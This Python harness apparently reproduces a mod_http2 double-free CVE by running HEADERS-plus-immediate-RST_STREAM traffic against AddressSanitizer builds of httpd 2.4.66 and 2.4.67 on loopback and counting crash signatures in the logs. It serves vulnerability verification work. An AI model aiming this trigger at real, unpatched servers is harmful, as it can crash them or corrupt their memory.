#!/usr/bin/env python3
"""Adjacent lane L2: CVE-2026-23918 mod_http2 double purge on early reset.

2.4.66 ships mod_http2 2.0.35, whose h2_mplx.c pushes a stream into m->spurge
at three unguarded sites; c1_purge_streams() then destroys every entry, so a
duplicate entry is a double free.  2.4.67 ships 2.0.39, whose add_for_purge()
dedups all three sites (httpd CHANGES 2.4.67: mod_http2 2.0.37 "Prevent double
purge of a stream, resulting in a double free. Fixes PR 69899").

Traffic is h2c HEADERS + immediate RST_STREAM (the advisory's "early reset")
with no header groom, so the separate CVE-2026-119618 pool corruption cannot
confound the result. Loopback only, sequential, one version at a time.
"""
import os
import re
import signal
import subprocess
import sys
import time

HERE = os.path.dirname(__file__)
BASE = os.path.join(HERE, "l2")
LOGS = os.path.join(HERE, "logs")
RUN = os.path.join(BASE, "run")
DOCROOT = os.path.join(HERE, os.pardir, "frontier", "apache2root", "htdocs")
for d in (LOGS, RUN):
    os.makedirs(d, exist_ok=True)

SIGS = ("double-free", "attempting double-free", "heap-use-after-free",
        "AddressSanitizer", "SEGV", "already in spurge", "stream not found",
        "unexpected .* streams in hold")


def conf_for(version, port):
    root = os.path.join(BASE, "install-%s-asan" % version)
    return """ServerRoot "{root}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule http2_module modules/mod_http2.so
ServerName localhost
ErrorLog "{err}"
LogLevel info
Protocols h2c http/1.1
H2Direct on
DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
</Directory>
""".format(root=root, pid=os.path.join(RUN, "l2-%s.pid" % version),
           port=port, err=os.path.join(LOGS, "l2-%s-error.log" % version),
           docroot=DOCROOT)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    with open(pidfile) as f:
        for line in f:
            try:
                pid = int(line.strip())
            except ValueError:
                continue
            try:
                os.kill(pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            return
        time.sleep(0.1)
    try:
        os.unlink(pidfile)
    except FileNotFoundError:
        pass


def probe(version, port, duration):
    err = os.path.join(LOGS, "l2-%s-error.log" % version)
    conf = os.path.join(RUN, "l2-%s.conf" % version)
    with open(conf, "w") as f:
        f.write(conf_for(version, port))
    if os.path.exists(err):
        os.unlink(err)
    stop(os.path.join(RUN, "l2-%s.pid" % version))
    httpd = os.path.join(BASE, "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    drive = os.path.join(HERE, "drive.py")
    cmd = [sys.executable, drive, "--port", str(port), "--fill", "0",
           "--shape", "rst", "--connections", "8", "--streams", "100",
           "--duration", str(duration)]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 60)
    stop(os.path.join(RUN, "l2-%s.pid" % version))
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    log = ""
    if os.path.exists(err):
        with open(err, errors="replace") as f:
            log = f.read()
    counts = {s: len(re.findall(s, log, re.I)) for s in SIGS}
    return dict(version=version, port=port, rc=out.returncode,
                drive_stdout=out.stdout[-1200:], drive_stderr=out.stderr[-600:],
                srv_rc=srv.returncode, signatures=counts,
                log_bytes=len(log), log_tail=log[-2500:])


def main():
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    for version, port in (("2.4.66", 7266), ("2.4.67", 7267)):
        r = probe(version, port, duration)
        print("=== %s port %d ===" % (version, port), flush=True)
        print("drive rc=%d srv_rc=%s signatures=%s log_bytes=%d" %
              (r["rc"], r["srv_rc"], r["signatures"], r["log_bytes"]), flush=True)
        print(r["drive_stdout"], flush=True)
        if r["drive_stderr"]:
            print("STDERR:", r["drive_stderr"], flush=True)
        print("LOG TAIL:\n" + r["log_tail"], flush=True)


if __name__ == "__main__":
    main()
